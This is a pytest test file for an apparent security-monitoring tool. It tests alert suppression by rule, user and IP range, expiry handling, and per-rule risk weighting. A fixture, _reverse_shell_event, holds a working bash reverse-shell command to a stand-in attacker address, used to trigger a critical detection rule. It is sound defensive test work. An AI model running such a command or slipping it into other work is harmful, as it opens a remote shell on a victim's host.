"""Tests for analyst tuning: alert suppression and per-rule risk weights."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

import pytest

from sentinelai.config.models import DetectionConfig, SentinelConfig, Suppression
from sentinelai.core.models import Alert, EventCategory, EventType, LogEvent, Severity
from sentinelai.core.pipeline import AnalysisPipeline
from sentinelai.detection.engine import RuleEngine
from sentinelai.detection.suppression import SuppressionMatcher
from sentinelai.risk.engine import RiskEngine
from tests.conftest import BASE_TS, make_event

NOW = BASE_TS
FUTURE = NOW + timedelta(days=7)
PAST = NOW - timedelta(days=1)
ATTACKER_IP = "203.0.113.5"


def _suppression(
    rule: str = "R001",
    *,
    user: str | None = None,
    ip: str | None = None,
    expires: datetime = FUTURE,
) -> Suppression:
    return Suppression(rule=rule, user=user, ip=ip, expires=expires)


def _alert(
    rule_id: str = "R001",
    *,
    ip: str | None = ATTACKER_IP,
    user: str | None = "alice",
    severity: Severity = Severity.ERROR,
) -> Alert:
    return Alert(
        rule_id=rule_id,
        rule_name="Test rule",
        title="Test alert",
        description="Synthetic alert for tests",
        category=EventCategory.AUTHENTICATION,
        severity=severity,
        first_seen=NOW,
        last_seen=NOW,
        ip=ip,
        user=user,
        hostname="web01",
    )


def _failed_logins(ip: str = ATTACKER_IP, count: int = 6) -> list[LogEvent]:
    return [
        make_event(
            offset=i,
            event_type=EventType.AUTH_FAILURE,
            category=EventCategory.AUTHENTICATION,
            ip=ip,
            user="alice",
        )
        for i in range(count)
    ]


def _reverse_shell_event() -> LogEvent:
    return make_event(
        event_type=EventType.SUDO_COMMAND,
        user="root",
        command="/bin/bash -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    )


def _detection(*suppressions: dict[str, Any]) -> DetectionConfig:
    return DetectionConfig(suppressions=list(suppressions))


def _entry(
    rule: str = "R001",
    *,
    ip: str | None = ATTACKER_IP,
    user: str | None = None,
    expires: datetime = FUTURE,
) -> dict[str, Any]:
    entry: dict[str, Any] = {"rule": rule, "expires": expires}
    if ip is not None:
        entry["ip"] = ip
    if user is not None:
        entry["user"] = user
    return entry


def _run(engine: RuleEngine, events: list[LogEvent]) -> list[Alert]:
    alerts: list[Alert] = []
    for event in events:
        alerts.extend(engine.process(event))
    return alerts


class TestSuppressionMatcher:
    def test_rule_and_user_match(self) -> None:
        entry = _suppression(user="alice")
        matcher = SuppressionMatcher([entry], NOW)
        assert matcher.match(_alert(user="alice")) is entry

    def test_different_user_does_not_match(self) -> None:
        matcher = SuppressionMatcher([_suppression(user="alice")], NOW)
        assert matcher.match(_alert(user="bob")) is None

    def test_user_scoped_entry_ignores_alert_without_user(self) -> None:
        matcher = SuppressionMatcher([_suppression(user="alice")], NOW)
        assert matcher.match(_alert(user=None)) is None

    def test_cidr_matches_ip_inside_range(self) -> None:
        entry = _suppression(ip="203.0.113.0/24")
        matcher = SuppressionMatcher([entry], NOW)
        assert matcher.match(_alert(ip="203.0.113.77")) is entry

    def test_cidr_does_not_match_ip_outside_range(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="203.0.113.0/24")], NOW)
        assert matcher.match(_alert(ip="203.0.114.1")) is None

    def test_single_ip_matches_exact_address_only(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip=ATTACKER_IP)], NOW)
        assert matcher.match(_alert(ip=ATTACKER_IP)) is not None
        assert matcher.match(_alert(ip="203.0.113.6")) is None

    def test_ipv6_cidr_inside_matches(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="2001:db8::/32")], NOW)
        assert matcher.match(_alert(ip="2001:db8:abcd::1")) is not None

    def test_ipv6_cidr_outside_does_not_match(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="2001:db8::/32")], NOW)
        assert matcher.match(_alert(ip="2001:db9::1")) is None

    def test_ipv4_alert_never_matches_ipv6_range(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="2001:db8::/32")], NOW)
        assert matcher.match(_alert(ip=ATTACKER_IP)) is None

    def test_user_and_ip_both_required(self) -> None:
        entry = _suppression(user="alice", ip=ATTACKER_IP)
        matcher = SuppressionMatcher([entry], NOW)
        assert matcher.match(_alert(user="alice", ip=ATTACKER_IP)) is entry
        assert matcher.match(_alert(user="alice", ip="198.51.100.1")) is None
        assert matcher.match(_alert(user="bob", ip=ATTACKER_IP)) is None

    def test_alert_without_ip_never_matches_ip_scoped_entry(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="0.0.0.0/0")], NOW)
        assert matcher.match(_alert(ip=None)) is None

    def test_alert_with_garbage_ip_never_matches_ip_scoped_entry(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip="0.0.0.0/0")], NOW)
        assert matcher.match(_alert(ip="not-an-ip")) is None

    def test_different_rule_never_matches(self) -> None:
        matcher = SuppressionMatcher([_suppression("R001", ip=ATTACKER_IP)], NOW)
        assert matcher.match(_alert("R002")) is None

    def test_expired_entry_is_ignored(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip=ATTACKER_IP, expires=PAST)], NOW)
        assert len(matcher) == 0
        assert matcher.match(_alert()) is None

    def test_entry_expiring_exactly_now_is_ignored(self) -> None:
        matcher = SuppressionMatcher([_suppression(ip=ATTACKER_IP, expires=NOW)], NOW)
        assert matcher.match(_alert()) is None

    def test_active_entry_used_when_expired_one_precedes_it(self) -> None:
        expired = _suppression(ip=ATTACKER_IP, expires=PAST)
        active = _suppression(ip=ATTACKER_IP, expires=FUTURE)
        matcher = SuppressionMatcher([expired, active], NOW)
        assert len(matcher) == 1
        assert matcher.match(_alert()) is active

    def test_expiry_is_evaluated_against_injected_now(self) -> None:
        entry = _suppression(ip=ATTACKER_IP, expires=FUTURE)
        later = FUTURE + timedelta(seconds=1)
        assert SuppressionMatcher([entry], NOW).match(_alert()) is entry
        assert SuppressionMatcher([entry], later).match(_alert()) is None

    def test_naive_now_is_treated_as_utc(self) -> None:
        entry = _suppression(ip=ATTACKER_IP, expires=FUTURE)
        matcher = SuppressionMatcher([entry], NOW.replace(tzinfo=None))
        assert matcher.match(_alert()) is entry

    def test_match_fields_equals_match(self) -> None:
        entry = _suppression(user="alice", ip="203.0.113.0/24")
        matcher = SuppressionMatcher([entry], NOW)
        for alert in (
            _alert(user="alice"),
            _alert(user="bob"),
            _alert(ip=None),
            _alert(ip="198.51.100.1"),
            _alert("R002"),
        ):
            assert matcher.match_fields(
                alert.rule_id, alert.ip, alert.user, alert.severity.value
            ) is matcher.match(alert)

    def test_empty_suppression_list_matches_nothing(self) -> None:
        matcher = SuppressionMatcher([], NOW)
        assert len(matcher) == 0
        assert matcher.match(_alert()) is None

    @pytest.mark.parametrize(
        "kwargs",
        [
            {"user": "root"},
            {"ip": ATTACKER_IP},
            {"user": "root", "ip": ATTACKER_IP},
            {"ip": "0.0.0.0/0"},
        ],
    )
    def test_critical_alert_is_never_suppressed(self, kwargs: dict[str, Any]) -> None:
        matcher = SuppressionMatcher([_suppression("R031", **kwargs)], NOW)
        alert = _alert("R031", user="root", ip=ATTACKER_IP, severity=Severity.CRITICAL)
        assert matcher.match(alert) is None
        assert matcher.match_fields("R031", ATTACKER_IP, "root", "critical") is None

    def test_same_entry_suppresses_non_critical_alert_of_same_rule(self) -> None:
        entry = _suppression("R031", user="root", ip=ATTACKER_IP)
        matcher = SuppressionMatcher([entry], NOW)
        assert matcher.match(_alert("R031", user="root", severity=Severity.ERROR)) is entry


class TestRuleEngineSuppression:
    def test_matching_suppression_raises_no_alert(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        assert _run(engine, _failed_logins()) == []

    def test_suppressed_alert_is_counted(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        _run(engine, _failed_logins())
        assert engine.suppressed_total == 1
        assert engine.suppressed_by_rule == {"R001": 1}

    def test_other_ip_still_raises_alert(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        alerts = _run(engine, _failed_logins(ip="198.51.100.9"))
        assert [a.rule_id for a in alerts] == ["R001"]
        assert engine.suppressed_total == 0

    def test_expired_suppression_still_raises_alert(self) -> None:
        engine = RuleEngine(_detection(_entry(expires=PAST)), now=lambda: NOW)
        alerts = _run(engine, _failed_logins())
        assert [a.rule_id for a in alerts] == ["R001"]
        assert engine.suppressed_total == 0

    def test_no_suppressions_configured_raises_alert(self) -> None:
        engine = RuleEngine(DetectionConfig(), now=lambda: NOW)
        assert [a.rule_id for a in _run(engine, _failed_logins())] == ["R001"]

    def test_suppressed_by_rule_returns_copy(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        _run(engine, _failed_logins())
        engine.suppressed_by_rule["R001"] = 99
        assert engine.suppressed_by_rule == {"R001": 1}

    def test_reset_clears_suppression_counters(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        _run(engine, _failed_logins())
        engine.reset()
        assert engine.suppressed_total == 0
        assert engine.suppressed_by_rule == {}

    def test_suppressed_alert_is_not_dedup_recorded(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        _run(engine, _failed_logins())
        assert engine.suppressed_total == 1
        assert engine._recent == {}

    def test_suppression_still_applies_after_reset(self) -> None:
        engine = RuleEngine(_detection(_entry()), now=lambda: NOW)
        _run(engine, _failed_logins())
        engine.reset()
        assert _run(engine, _failed_logins()) == []
        assert engine.suppressed_total == 1

    def test_critical_alert_not_suppressed_by_engine(self) -> None:
        config = _detection(_entry("R031", ip=None, user="root"))
        engine = RuleEngine(config, now=lambda: NOW)
        alerts = engine.process(_reverse_shell_event())
        assert any(a.rule_id == "R031" for a in alerts)
        assert engine.suppressed_by_rule.get("R031", 0) == 0


class TestPipelineSuppression:
    @staticmethod
    def _pipeline(config: SentinelConfig, *entries: dict[str, Any]) -> AnalysisPipeline:
        config.detection.suppressions = list(entries)
        config.validate()
        return AnalysisPipeline(config)

    def test_suppressed_alert_counted_in_statistics_and_excluded(
        self, test_config: SentinelConfig
    ) -> None:
        pipeline = self._pipeline(
            test_config, _entry(expires=datetime.now(timezone.utc) + timedelta(days=1))
        )
        try:
            result = pipeline.run_scan(_failed_logins(), use_ai=False)
        finally:
            pipeline.close()
        assert result.statistics.suppressed["R001"] == 1
        assert all(a.rule_id != "R001" for a in result.alerts)

    def test_unsuppressed_scan_reports_alert_and_no_suppressed_stats(
        self, test_config: SentinelConfig
    ) -> None:
        pipeline = self._pipeline(test_config)
        try:
            result = pipeline.run_scan(_failed_logins(), use_ai=False)
        finally:
            pipeline.close()
        assert any(a.rule_id == "R001" for a in result.alerts)
        assert sum(result.statistics.suppressed.values()) == 0

    def test_critical_alert_still_raised_despite_suppression(
        self, test_config: SentinelConfig
    ) -> None:
        pipeline = self._pipeline(
            test_config,
            _entry("R031", ip=None, user="root",
                   expires=datetime.now(timezone.utc) + timedelta(days=1)),
        )
        try:
            result = pipeline.run_scan([_reverse_shell_event()], use_ai=False)
        finally:
            pipeline.close()
        critical = [a for a in result.alerts if a.rule_id == "R031"]
        assert len(critical) == 1
        assert critical[0].severity is Severity.CRITICAL
        assert result.statistics.suppressed.get("R031", 0) == 0


class TestRiskRuleWeights:
    @staticmethod
    def _score(engine: RiskEngine, rule_id: str = "R001") -> Alert:
        alert = _alert(rule_id)
        engine.score(alert)
        return alert

    def test_default_engine_has_no_tuning_factor(self) -> None:
        alert = self._score(RiskEngine())
        assert all(f.name != "analyst_tuning" for f in alert.risk.factors)

    def test_default_engine_score_is_clamped_sum_of_points(self) -> None:
        alert = self._score(RiskEngine())
        raw = sum(f.points for f in alert.risk.factors)
        assert alert.risk.score == pytest.approx(max(0.0, min(100.0, raw)))
        assert 0.0 < alert.risk.score <= 100.0

    def test_half_weight_halves_score(self) -> None:
        base = self._score(RiskEngine()).risk.score
        weighted = self._score(RiskEngine(rule_weights={"R001": 0.5})).risk.score
        assert weighted == pytest.approx(base * 0.5, abs=0.5)
        assert weighted < base

    def test_weighted_alert_has_negative_analyst_tuning_factor(self) -> None:
        alert = self._score(RiskEngine(rule_weights={"R001": 0.5}))
        tuning = [f for f in alert.risk.factors if f.name == "analyst_tuning"]
        assert len(tuning) == 1
        assert tuning[0].points < 0
        assert "R001" in tuning[0].reason

    def test_weighted_score_equals_clamped_sum_of_factor_points(self) -> None:
        alert = self._score(RiskEngine(rule_weights={"R001": 0.5}))
        raw = sum(f.points for f in alert.risk.factors)
        assert alert.risk.score == pytest.approx(max(0.0, min(100.0, raw)))

    def test_boost_weight_adds_positive_factor_and_stays_within_100(self) -> None:
        base = self._score(RiskEngine()).risk.score
        alert = self._score(RiskEngine(rule_weights={"R001": 1.5}))
        assert alert.risk.score <= 100.0
        assert alert.risk.score >= base
        raw = sum(f.points for f in alert.risk.factors)
        assert alert.risk.score == pytest.approx(max(0.0, min(100.0, raw)))

    def test_weight_one_is_identical_to_default_engine(self) -> None:
        default = self._score(RiskEngine()).risk
        weighted = self._score(RiskEngine(rule_weights={"R001": 1.0})).risk
        assert weighted.score == default.score
        assert [(f.name, f.points) for f in weighted.factors] == [
            (f.name, f.points) for f in default.factors
        ]
        assert all(f.name != "analyst_tuning" for f in weighted.factors)

    def test_empty_weights_identical_to_default_engine(self) -> None:
        default = self._score(RiskEngine()).risk
        weighted = self._score(RiskEngine(rule_weights={})).risk
        assert weighted.score == default.score
        assert [f.name for f in weighted.factors] == [f.name for f in default.factors]

    def test_other_rules_are_unaffected_by_weight(self) -> None:
        default = self._score(RiskEngine(), "R002").risk
        weighted = self._score(RiskEngine(rule_weights={"R001": 0.5}), "R002").risk
        assert weighted.score == default.score
        assert [f.name for f in weighted.factors] == [f.name for f in default.factors]

    def test_rule_weights_property_returns_copy(self) -> None:
        engine = RiskEngine(rule_weights={"R001": 0.5})
        engine.rule_weights["R001"] = 1.5
        engine.rule_weights["R002"] = 0.7
        assert engine.rule_weights == {"R001": 0.5}

    def test_constructor_does_not_alias_caller_mapping(self) -> None:
        weights = {"R001": 0.5}
        engine = RiskEngine(rule_weights=weights)
        weights["R001"] = 1.5
        assert engine.rule_weights == {"R001": 0.5}

    def test_default_engine_has_empty_rule_weights(self) -> None:
        assert RiskEngine().rule_weights == {}


class TestRiskEngineDefaultRegression:
    def test_r001_alert_default_output_is_stable(self) -> None:
        first = RiskEngine().score(_alert("R001"))
        second = RiskEngine().score(_alert("R001"))
        assert first.score == second.score
        assert [(f.name, f.points) for f in first.factors] == [
            (f.name, f.points) for f in second.factors
        ]
        assert {f.name for f in first.factors}.isdisjoint({"analyst_tuning"})
        assert 0.0 < first.score <= 100.0
